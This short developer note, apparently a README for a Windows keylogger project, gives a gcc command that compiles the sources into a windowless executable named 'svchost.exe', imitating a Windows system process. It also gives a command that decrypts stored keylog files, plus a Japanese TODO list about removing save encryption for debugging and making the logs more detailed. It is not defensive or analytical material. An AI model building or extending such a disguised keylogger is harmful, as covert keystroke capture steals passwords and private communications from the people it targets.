
use `gcc -I./include src/*.c -o bin/svchost.exe -luser32 -mwindows` to compile

use `svchost.exe -decrypt {path}encrypted_keylogs_1234567890.bin` to decode (temp)

TODO：
> 保存する時の暗号化を消しとく(デバッグ用）
> 
> 保存のlogをもっと具体化したい
